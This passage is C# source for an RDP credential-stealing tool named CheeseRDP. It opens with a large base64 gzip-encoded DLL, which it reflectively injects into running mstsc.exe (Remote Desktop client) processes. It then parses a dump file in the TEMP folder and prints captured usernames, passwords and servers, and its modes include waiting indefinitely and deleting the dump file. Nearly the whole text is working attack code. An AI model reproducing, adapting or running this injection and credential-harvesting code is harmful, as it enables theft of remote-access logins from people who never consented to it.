PUZCCbju+PdzWnPi00ZluxZL/tN0vw096wOX6p0ow7ff9/uAwN33Bp6B64fTJqkn4J3W4QNGEoFvUyOPChi6qR99OCb8motztXQ5uH1bwdSxAeMd0wV2DsUlX7Mn4rT+pt+Tf3ZQJr8oZbM8X/VMhWjfQ7j6SiwdQbHlSF3J9G5pWLzfosdN4Y3nWvX4rWg1neHlg4A6YUXrz6K6zD5OXyPx1kY/f2OtjPoUBiJQ5XTHzaiqRaln8vEC32sh7x+8wUwcGGjwCaM2Ypha+4lqYQpatzADjTLkXdygkxyNxvnjiOpyN7QraEOrkdsasBisCIk0tFG7tER+99ATvHeq4nmwPu5eJcSpnM70FwVWXipU8mb93Dm8NAjbM2ufv2jnWSRhoVOS6Wl2cPGKalE+9Kg53XNolp+lrgWj1vOaIlfjV12e2eMnwbm8bKfERdyzqNG+n4NNXZActiowb4IdurEWe/4+uhIxfHZGZe3iuYt5fJ2pybOexzn3I/V8XOuKB2HwfJiGgzP5e1i03CxeYlObBZ1+pFJsk9NDGsv3mFtUovKuz7FYCEeeNL2kHgHsGt/R4Iww3V0DpJ9V0LZF1LZ+4eQvSMqu+lbZBsTyj5G3uAXMSAg47+HUxnBDl1fC6TGXQPtS0QlPwcGMKDAIm8Els86Vf70YyYyQ7wke/D4LjWYXbQ36bNNdCH1AXlbqrHrImVl5SRlRNKvCpP0KSYl3ULT1+mwrQVYvN7l0DHdiJp1Q1Z71il9i1PqcGW97ZRecGzqr/R7yx2bPrrJWxlwSmel/qxTjua5Ktfwbn2LY9PHZZXe7CaNxTX8eZCjkT5HLwnWjWkBjxhMP3QVLuj6bwjr57QnqwS/dU5BcpLgv2JONZKLtYc//wr8cPNai3hUJajoW1P12ztqMpzgF8As7Ah2q5xN2jIIhlIgDt//Sh69dTaLX87qX38V1hVKd0ro6WqUsvXH3htWk+oa3gF5J01CN+qSq6gb5WxKN0FQf+yvGfrgIzRCDRFP4QHlpsu+GkfSLqlZB7+X1tSAeNUZsePPZnH4GVwN07tsYzuv6wwsl7S/B+5gt65L+zsIoBFq0j4FIcdnnWa/Ldht7tLuAKglCS3jyJvn1WecV/Y4Z/XQe3pmS+/s3kB6MD0Iqfamy9aNo36IFRdQfjKIDOQ1u8S5hkBW+0xtOdbxsfbIkp3pZ7NWTWzRm6BTnx2HxS5RJDkVX9CgKGZ43A3JeEGmkt9Z5HcO+aXxDvI7l/y+Rn43kt9t5PfmGP615Deb/BaR3wryW0V+15Hf4eR3A7T/9GFV5+ms9s6E6/lw76DFfnz6uDuSYzcE7EvpePxAbMoB99QFX0ESmlweyeWZA4XBlN7logu5FAiQXUNXJvXn+Pzg+LrsLP81kuuaSH6rkp8e73JZE+ePLd8Oov7Z8sEPctlYfovkskTym5X8dMfVZWb5I5kfzCHu0+19gQFcE0WjzXIRxGzm+Snzic8U5kyMk1QS2d+xomq7m9Of+xD3bVzV0lJw73MKZO1nVFImlURyZJ3aZMNa6h/tkDogXvh/+mfa/fF4JYePs3ftn2VUZvQrRg0NlJoZzWTUyegTjK+U4bsZfYjRxxk9zOhJRl9n9ANGv2H0Qla/niZKW5n8nzKay/jqGD6u8DH6A0ZrGV3B6PWMjmV0BKOfNlLay6jyqeP66TDDuxg9xuhZRj9mNPUBSi0PxOfPZfKfYfG/5tLfYriU0XpGtzD6KaPdjF7I5E1jdAeLn8+1w82V830Or19N/+6FQrfeSWk7RyMfA4f/yc+M6ZSyv+cgLM9e4MxeDNepZl3N2qq1M6av8AUqi8vLs6ZN9tZ6BSEWmceOK60Ze82V6CAvF7KFBYITfhcTeSuEGmEdfNcKVfCdIUyHGJ8QECqFYgH/wB7+yb3JgleohS9+hkozC2OFcUIpSBorXCNcKUxl9T66KOmDP634rWPLmQmfttyp/7BYWCWsBj78i37VwmQmSRCyKwpXe0vLqx3VZcu8vpqyqkoXeYRqybqK7Moyf1lhedndXoqXeP0Lq/GP8NVQfBOH8U8A5lQVB8q90Gk0ncLsypIq7McrKN88X1XFgsIK2q4cYYkwV1gIveKCf5Ohh9wCHnXOn1vlc9V6cwrLKuP6P7z9jckzs5rn1614dYvxhuMPK9fJ8wi9zv2PxF/vMPepW0vTG0spTSujdGnlnZVVayvN3toiL2kUyz8wBP+qwmJzIf4xw0LKXFv7LXw+X+E6c6V3rbncW7naX0oEr6PpvXdQmgutzxE8kXqPgyu6Aq5SoeCH72S4emUC1mkJXEGfsIb8XgdXH/lShaXwizGVwFsBoWiKB2JqmJ75QF40JTVSlvI3Z3CHCv8WiX8dfO+MT8NboHh7tAfSerg0sqEImc9B2jkubQQ3nmz/zmD8lo9pc+JxbvbR+EzfEHbg/1J9/tmPldXPxqidUeuP/z379c9+Ysuq2wzz1Fqga7+dvz0m/QzHW7c5Gqa7evRvObVyfLHl5kEecy0Ze0N+UFdttVHsqR1ctiJLkR1bvrk2ni+2/FbIs7WWjOkhP7iAaItJ76kdug6KTOXPHsXWY+u31KMH8lhhTAnrhq4H0ZWYdA/H2zNE/1tj+BYvcS55ffZtRXmqm+b9/PsDq6/6yx34WJIw97oVS2tgUlhRnFVYXJRZ7J3smbsw25PrWpK7ogb/CJJ3hc9bXVWzYnFxdW5pmbdkRS3Mh4u95d7CGm8kcnJ1Mfu7TGPYF/sBXyJ+09xcN/4NAzxSQf7uk6W4DPkMEFF3mxJXQUzx5jtpvZU4S2amcAbiHlYpcbWRvy01uQz/lpPle5gPxr+Aq4LJmZlFJXgL3IcvUgY8d3GuJW+ug/RZfBw+Py3kxcfdinEFcXHZJG9pfBzhq46L8xC+2vg4wlcXF5dL+Brj4wjfZojr10Ac+5tXOB4/VSnY4kMetNnT1ZG4u+++u3gVNFdoXc/k+fxFlmwHKeNwXNytpIy22LhcytceF0f5uiGuF8uppXVprQObLyiYPn6NfzsM/7gouw64KyuI94GNjsZlkf68L+56EU8L/eRybSRuBlEc0GF8/EL5W144plsVjM1/BPocVp2TV9XUEP6t9O94KX/TC/9OFz5frPztLsLTy+rD/k4XieuHOpH21viKLJnElSrop39ojcVNE/7Bj2qkRhjpSy9I8wzPvEKbJGj9KYIZ9LrQQPuQxL2fTHApfF9dT/2jeJyET5XG50OdjsGjL0kW0ny6/uReTYHak5SZmw92EXiu0CUJOv9IQYD/U+GbuYHmjcWjx2iF9OmPqtJVm1XJMHYwL/4JIZK3+IeqM8B36Si4HixvLFYlJwnJ05IyVRqVoIHxPSwtSUhTjRQuupPapIUXCcJT8DWUU8r4PcMuUAkX/FmI8F0FF+Hdi2EMllOqGqESRoA8qJSQDvoxbJhKGBbDP8IoCL+4UCBjHykp/zijN0KbLsd67CNtwQfQVJgf5KguSRIuURmp/OOsHOBXmVSC6Tij2A6MjymvFK44auvmckqJvLEsv0JRPrbrPlYPBa9i/C2MKvhG1j7Mn6YS0oCOnoT1u4jUe6vA8o9l9fozo0p9Uf5FKuEiha6idR1p1AlG/zDBWJwiGKcnC8ZpI3uxHeRP3q0QhBB8Xyyn+rngdkG45fYoHpmqEVKn64TUxcnVmAePyP0Q0n8N3/cZTyOEn4fv1wy/AuE/xaQjficmfdjFycLF0/XCxb4LezOqLyhQ+tS4UhC+hO/ICkqJbixO8qj0yYIe6q6HuuunDa9WJamEJLyjqtMIOp+mWl0A+pauAZ0dJqRPS/YMw74eG71WXTCKF8Gy4qYKSkl+fEd5hk7IKIZvboqQAbIzphmqVUYt9NExwahqE5KRh7Q/WUidllxN6wHf6VpBP2o4eWOJMi/Hzs/Mkxe66waPf+zzXojXbYqPx7kuj83JynyMdqhx9WAZdQn47KWD+ZR6eDYNTkM/pXpT4roon9YE5bwfU5+6+6Jhy/1gf6qp7VY+HtxLgLjqmDg/xBkgbkswGvdTiLPdBeXFxF0H63sR4gpi/obiCvK6NKhvTNx6iGsFvuqYuF9AnMGHR2+ice0Q13hX4nbi5z/7S5T+Z3+Jfvj9pblJN3n9rso1Zb6qygpvpX9Zoa+scFW5d7nwe2Guz1vo984rQzQuebmvjAKhSZhbXlXjFQsriwG9qV1W5vMHCssd5eQvdk6mnB5fVZG3pibHW1HlW4d+D5QzN+DzQRksSbDExOWWQmFgz+7AOHdhjd/l81WBrju0S+LwL7S5Xl9FWWVhpASww5rF3ppAhVeR0avUCDj83iI/7vD8WYlbFPD61mHMOxwXzMdxPIKwKSmypUPbulwQxg2qczaU+GPtkkBNtbeymFVBpQYuGp5bVUn/xKsXW8LF7VHNKw/UlGZX1vh9gSLcWZlbWFTqBW+O1WSez+sVbnYtXuByZ02bXFwOM802vC7F2TU5hb6a0sJybzFCqE1ZYTnUz+Fc5vBkK7wngHddtZ+1ULkWcxff4sllLCuEJTXVZR5Y1xT6vPOqfChsMenFJd6igI9xzRYqvBVF1ZD3egzVeP3oKefnz82HVheVlZQV5ZeSHvLhTk5+fo2/ON+/rtqbX1ZZUpVf7IXmVa3LLy+r8aNnRdMjO0/5RVUoeeygeJYP5qD8ubW10HVVa13R7aplcxcvXZCbneOaOj2TtnYklVBWBRIrKkDAmpq11b6ySn8J+ohQlzWF5WXF+dDSwgqv3+vLr6zC+mGNvD5fZZUg3C9AiUUVYMdnIH+ZH7gqhGuj4XwvtruosLy80ru2FFZ1FYVU628Q8mu8pfklZeUoGKtjAr6qypKy1QGfN7+yENR3bX6hb/UaQcii8uheo5LkjY5BWNnEcVRVemvL/Pl+HJekn7y1cG38XMKFUB5CnM9KUG2EwuqySRU1k9aWVU4q8vknka6ZVD510tRJtMO4dF8AlKjC+y0c0DlllatjGXiOUm9hdVz6a5rF/vK5hdV+6AVF7f+Ace6qqjsD1fMClUTtXZV+1Mz3MIWp/tJKEAp62K5dWkmVqzhy9eeRbhaEjTimhkx+SJ1dw4xElW8e2DKoA2h6DXbxYg0Z5B6vr6TKV1FYWQS1g/ZDrisGWyoY4p9g7JJ1NX5vRS50kqMGLSGGhCp1dON4iRtUXMTh0wBlO72rAqtXe31KmUN8qhmtw58XbzefLXk1HFZOnCk+Cvph6GNNMTPuAUoU/+zQbXTfbA+j/f74fbTJNziWrSoszifqagdVsNtJfCK+yAj8Dj4iD/d682Ew5NO9XiVLIv6IRWAy//OJX9vGroWRHoSvvJ7S5+H71XpK34Jv2gZK8VSoGcKx61yk34evuIHSLviu2BC/nkWaeQH4GRsovRW+WyBcANSWAf4UhPH5oDfhexjCvUB/DetPw70wIoG+BGvcNpQJ9O+wju3FOlwC8zd88e+IVwN96hKatx3o+5fBjAHx/UBbLgcK4cNA/wLfrRgP9KoxNJwJ9Adj8DQSYKBJZho2AL0cFuYFEDYDnTCWhjOBVoyleauBPs3C7bgHMg7qiDxAb70K+hnCHqsgNFwN9YfwZqC98O25l1LvBFrnw0BHwPhrxXKBBlnYDuvjKbAurkOZQP8C316sP9DbpkOZEC4AetUMkIE8QBtnUJmbgXbMoP1zBuifZsPaCMsFmjQHrjmWBXTlDbRdBUBb7SAD+wroFQ4qJxOoHb62eyl9xwUU5QB9YR60D+UDzbgJ/GDsK6D74FuNfQL0g/lQzkaoM9BNN8N8AeHNQP/Iwr1AbW4atgPtyaFhYYEgPLKAhrcCHbWQyQdauJDGVwP9NQu3A8X1KIbxfV6LWbgA6BkWRmpfxMoCGlwM8rA+QEcvofFmoJZcWlYm0JKllKca6IxlNN4O9Brwf3QQnwl0II/GC7cIQtMt9LpvBvoJfK3YllvBU7kNeJH/NmI3hQHsN6AfwdcG8Z8Cda6g/Yz0Vljrz4b4FUB74Vu7kdKR+YJwGsIZQBfB96uNdG/prnya1w/0Jfim1YF8pAV0fGUAFVkY6ehCqoeXAm2GLz6rvBno7FXQXggXAL1nFZW5HuhvWbgN6DkWRqoqomEN0GtYGKmDhZ1Ad8A3t47SV1k8UpmFkU4tpnWbDvRZFm4Hmge+xTV1lK730nikO1m4DWgSrKdLgUcD1EWWW1gTdwLFpalmt9g/673CQOqtViOgUkkGJMFa66dtpRcFNQGKLEXAkJtAkEAUW4dyS1tQRIHothhrBVyBgBgJMFwsCviJDUqEOIEQMYYMoEmESWbp076dt/Odc34PB+gHg/YO1G6uJsOuXyEabYElWy9SHnW1FYQq/CsJ5akKeuWIe8Lhle/OrfXULfV64VPO0jP6PdPJ8wff0vumjPrcEixu5pifsw4HOdaFeD2PigTuI1ncAPeR4YG8TfmvMpd/OrPNfU2HE1q4piPkfBjj6wse0WlDbBY1v44w75+vWLvMSdD3U2hVZ7Jcy2bkDaKcvoMv1p2MXO3KzkX3QOHig7+H8kHH4M8fc09sRb5hXh/BNwOlaAoRjydwTwRFaBZBGhadNdQyKR/FPwTRLdhC4AVLVyH+hhs/or/C0i2IP4ZXQs35aIlYshDpgZqz0VhYug7x5ZLyEfwA5NMXQ19vTQRhz/BPQDSK7YEq7mMboN7RV7EbEaWQmYf2w0QI6Hs2mOFbknxvby4aALvMZZPjtY2vnkAVKGaGpRTEwpUxmdI1iEn0+M+YFYhJ6PgA5EG9Y7gU6O/HMBAxU30SdYdfYvhq4D+GLwYmkWQDUiKUwMg0U+qO8I04D4pqxXSw+hf0DeT3TLAKiRA25qAdkE3U+D36B8ztxrYCfSsWDHN7sXdAhKgxF/3rqVSwAsmEqrEbiqIVz3BPUGPs1IggCpGePSAk0mqPx6mHUew1RC4A+ntYAVTNScxBLzKlNOQ0VG0SUBCrCadAyaOCJQht9EY7hjCf3sesYkcM4I/NjCwC5EmUPYr/CmXlo2wDLofVP6BsDA+DiQDA7sUUYscKyLUOaRDNNBagvtBwr1HfWoCUc2f8gHVMQF8v80DsIgmtRMaOcLn5Od9HPISOzYisA4sWOxhQVjaqMeJFEKsNCwS0yp6CfGssd7bC4FCM4VYmsRBRGAXBSDBTWkbXFH3Gbq1kd2FF0IRhKk08YF+KKEy4O8TqwVbARAbQtGMB3MyoMfwQ0LRhETDhiUSbcC9oAsMvQll5KF/s8IBcaxCyHUtjPr2HpcFEPNB0YXaYiIZc7gjZHVOKZkKuk+gqoBjBZWLHTkAWoE7IlYPSxI4lQNaNacSOADDnOg9hm/C54L+g0UJHEpChMaKAnTmDJTtohaRi2OM9enuMxW4Qbo3IegdJKVPHQPuMuAAohUal2Ch/1t1Pt3znGtBoaP+KrviZTn5cTeQxCauV2l6StjLCZeSmxzIJvpUqMMpHuiNslED955MkkRUqTS9qnFovNoZh3X2jo18Y8Y9AvFASFOGyN06ddc6rJJJuTfHK1KVQcyFay9x+kS4DEc03aZeK2UfZoa2bhloxL3h7CboP3GZul6MM4cFRQSBiEju+A7fhMhSbD0XdjfEw0TYZ8CPAHxP4ISUiyUqkRMyUow0CRzjQd2LLoOZylA6X9WFvVbLPs5aKzntXdc2Gvu0x6PHteG5WOnzflRg0XLv6IGyL6BFsUNbETRvmiBi3l5fJDvXWK7PRs1C14YbovZaJKw4/MMvkojFshAJFoVg9VG3Eg4C+B8tgqitQL6bUH2GIGgvNfV9wSfpuv2WZ/xARr8tYHwkcWYDdgn0KGELHDvAZlJWD9kAuFnKWOnOt5Gt1aT+ym0lQAPkTKhc5tgAyB2WP4csB+T3KNs6Q8dyZEcgFI7JWLFokMfu++u+q+fwRgTvSIJZQ1/PXI2lCCQPh3Jq8g9RST9soTLUCpTKlP6EIU3qeTkZArm2IDMXWMwkOYP+JrYGSZ33S3/4ge87rPURhwPshlzeiwPBaKNnUKaYi8viOgYYis2bJUkOpW7YiVjJ9JJdqoQpslbqV/vwHWaHnLuV2+OfndylhwvBYQmSE0+IIdfskqZt1KyMGmEQQon82aJ+D5dsH7Yb/Q5vp8gfkD6jMeOO+pc8mdFCqyY8X0qcH4Go2eRGliRx8aCJ+asb0DbFISaPVvkodq5G23WjdOaksU/+NcWd0i6MvQHoGcyskxWCuDX+YWIZoxvAvZ91su5ZOKw4Xas55KRTCkfQHWVRG8xunfDPy5nVfSpm0oxl3Xc2mjZnslRck3DZM0T5CSl3km6+GB3BNpHxOM9gbpzZd+LF8vrxg93pGwA5i87tDtS2mVMbaze/X8q9WfciouVwTVBqQ9WL0/uR3/LivDggPGV/AIyVjvRf/7cWvnlwRvnzFuYgDJ0z50aaqlTL09fjvte5Jieplf3QPlO4Ijespm3SLNqZs21U5nNt2Yc+yuF3N1y5cW0z+9p9rueZ3kjZ+UFMaNMydO3/hhqpJ/zzfdz8p7al1NocW0PR5bb8VOEHCodg9rLuHTssvF78Z2LJwC8sa6fZhB+fl5NmqDXR7tU37yeLYosjRDf+8mqO73clJ9uvSwyPuSTfpA/uHxl8XMKjd0C6JWtbr+KVtytMqmS4+uuqbM35xtuLGoJ6KxQlQqm5ppX4esaZEfaHi8paGg5ytnGO+tuVheTwkc3dr4UPvv4IDrY9vxpoLVd6W4Ka0u8EzaY9T01ONFs/H615qLYEvO03tk97rDOF9WnVVCofTYDvWEa+Je0AZCuwPNAfqAoWcYdVDXr3Os4H3RNtUxePYVRW8KdUpXtPyJcVHkxZxpg7v5SRyPDmqujpVXf3xhld1d30pvk2WKxatRWUx2NSWSl1SAyNZf/NOSobONmEJ0RktFF1K8OfB14OPBbd7p3/ZP+hd8GV/+NUEe6HP1fEWMLSvf595n26fMH6492F5fbBXWvKTJ021vHh7b0X5VO+p8qbIK5HaSFXk6jrl8QhLdWckJ7V+IlH3150/4ksW+j6yBFpUEyrL8jSTxW8o8vZtof3cUNVtXWqadeKJr9XncVXStvrDHF7VkaSopIQkXlKs+ZxWq1VpJ7QV4bdSLh1o6KrraupS7X5a1KA8Hmap6Azh2OomEnT9d5TxcnX8t/LkmoSalBpeTSODzx8fHrxTkNHwkjekUzVk8Pui0q0tUUOsfpaZpWMJo4ebH2bWz3raeU8Gmmp40fbmisyp5lOZTc4rTq1T5TS41M7K2SQ7Y0J/U5Mi07kmnCGzRidlNoX6OfU69Ri1nZJO3evxyOfo9hvGUPMpFWWIegLcpS4Az8EFcNhjEORSp8E5n+shjyWCe63a0zzqbQ8bVOwBoEfeW71v+tz0Xuxh9N4Ysj/j6uSDczurkEGQQnsBr6V5MtfWodsW/HpJlziYOJSo25i9oDi5amiwMcX9+Q6dNvnB/HRzi5Y82koq6+dBaYmk5jOP4/rLVPLp9teKPvKRslFQYCfnPbzefGTTnXnz/gduKukc/EkAAA==";
            string dumpFile = Path.Combine(Environment.GetEnvironmentVariable("TEMP"), "data.bin");

            // List of PIDs to check if injected processes have exited
            List<int> PIDs = new List<int>();

            // Keep track of processes where we've already injected
            List<int> injectedProcesses = new List<int>();

            // Reflective DllMapper
            DllMapper dllMapper = new DllMapper(DllMapper.FromBase64GZipped(base64dll, 2));

            // List of collected credentials
            List<Credential> credentialsList = new List<Credential>();

            int wait_limit = -10;
            int wait_time = 1000;

            if ((args.Length >= 1) && (args[0] == "help"))
            {
                PrintHelp();
                return;
            }
            else if ((args.Length >= 1) && (args[0] == "wait"))
            {
                wait_limit = 1;
                wait_time = 3000;
            }

            else if ((args.Length >= 1) && (args[0] == "dump"))
            {
                try
                {
                    if (File.Exists(dumpFile))
                    {
                        ParseOutput(dumpFile, credentialsList);
                    }
                }
                catch
                {
                }
                return;
            }

            else if ((args.Length >= 1) && (args[0] == "clean"))
            {
                try
                {
                    if (File.Exists(dumpFile))
                    {
                        File.Delete(dumpFile);
                    }
                }
                catch
                {
                }
                return;
            }

            Console.WriteLine("[*] Waiting for mstsc.exe...");

            while (wait_limit != 0)
            {
                // Reset list of PIDs and get processes
                PIDs.Clear();

                if (injectedProcesses.Count > 0)
                {
                    try
                    {
                        if (File.Exists(dumpFile))
                        {
                            ParseOutput(dumpFile, credentialsList);
                        }
                    }
                    catch
                    {
                    }
                }

                foreach (Process p in Process.GetProcesses().ToList())
                {
                    PIDs.Add(p.Id);
                    // Only inject if the process is mstsc and if we haven't already injected
                    if (p.ProcessName == "mstsc" && injectedProcesses.IndexOf(p.Id) == -1)
                    {
                        try
                        {

                            Console.Write($"[*] Injecting into process {p.Id}... ");

                            bool result = dllMapper.Map(p);

                            if (!result)
                            {
                                Console.WriteLine("Failed");
                                continue;
                            }
                            injectedProcesses.Add(p.Id);
                            Console.WriteLine("Success");

                        }
                        catch (Exception e)
                        {
                            Console.WriteLine($"[-] Exception: {e}");
                        }
                    }
                }
                // Check for exited injected processes
                for (int i = 0; i < injectedProcesses.Count; i++)
                {
                    if (PIDs.IndexOf(injectedProcesses[i]) == -1)
                    {
                        Console.WriteLine($"[*] Process {injectedProcesses[i]} terminated");
                        injectedProcesses.Remove(injectedProcesses[i]);
                    }
                }

                // Avoid Active Polling

                Thread.Sleep(wait_time);
                wait_limit++;
            }
        }

        public static void PrintHelp()
        {

            Console.Write(@"
Usage:
    CheeseRDP [actions]
Actions:
    wait: keep listening for any new mstsc.exe process indefinitely (stop with ctrl-C)
    clean: delete the credentials dump file if present
    dump: dump the content of the file if present, parsing the credentials in a compact format
");

        }

        public static void ParseOutput(string dumpFile, List<Credential> credentialsList)
        {
            Encoding unicode = new UnicodeEncoding();
            string dump;

            using (var fs = new FileStream(dumpFile, FileMode.Open))
            {
                Byte[] bytes = new Byte[fs.Length];
                fs.Read(bytes, 0, (int)fs.Length);

                dump = unicode.GetString(bytes);
                string[] lines = dump.Split('\n');

                Credential credential = new Credential();

                foreach (string line in lines)
                {
                    if (Regex.IsMatch(line, @"^\s*Server"))
                    {
                        credential.Server = line.Split(':')[1].Trim();
                    }
                    else if (Regex.IsMatch(line, @"^\s*Username"))
                    {
                        credential.User = line.Split(':')[1].Trim();
                    }
                    else if (Regex.IsMatch(line, @"^\s*Password"))
                    {
                        credential.Password = line.Split(':')[1].Trim();
                    }

                    credential.Clean();

                    if (credential.IsComplete())
                    {
                        credential.UpdateHash();

                        if (!credentialsList.Contains(credential))
                        {
                            Console.WriteLine($"{credential.User}:{credential.Password}@{credential.Server}");
                            credentialsList.Add(credential);
                        }
                        credential = new Credential();
                    }
                }
            }
        }

        public class Credential : IEquatable<Credential>
        {
            string hash;
            string server;
            string user;
            string password;

            public string Hash
            {
                get { return hash; }
                set { hash = value; }
            }
            public string Server
            {
                get { return server; }
                set { server = value; }
            }
            public string User
            {
                get { return user; }
                set { user = value; }
            }
            public string Password
            {
                get { return password; }
                set { password = value; }
            }

            public Credential()
            {
                this.user = null;
                this.password = null;
                this.server = null;
                this.hash = null;
            }

            public Credential(string user, string password, string server)
            {
                this.user = user;
                this.password = password;
                this.server = server;
                this.UpdateHash();
            }

            public void Reset()
            {
                this.user = null;
                this.password = null;
                this.server = null;
                this.hash = null;
            }

            public void Clean()
            {
                if (this.user == "(null)")
                {
                    this.user = null;
                }
                if (this.password == "(null)")
                {
                    this.password = null;
                }
                if (this.server == "(null)")
                {
                    this.server = null;
                }

            }

            public void UpdateHash()
            {
                this.hash = CreateMD5($"{this.server}:{this.user}:{this.password}");
            }

            public bool IsComplete()
            {
                return (this.user != null) && (this.password != null) && (this.server != null);
            }

            public static string CreateMD5(string input)
            {
                // Use input string to calculate MD5 hash
                using (System.Security.Cryptography.MD5 md5 = System.Security.Cryptography.MD5.Create())
                {
                    byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);
                    byte[] hashBytes = md5.ComputeHash(inputBytes);

                    // Convert the byte array to hexadecimal string
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < hashBytes.Length; i++)
                    {
                        sb.Append(hashBytes[i].ToString("X2"));
                    }
                    return sb.ToString();
                }
            }

            public bool Equals(Credential other)
            {
                if (other == null) return false;

                if (other != null)
                    return this.Hash == other.Hash;
                else
                    throw new ArgumentException("Object is not a Credential");
            }
        }
    }
}
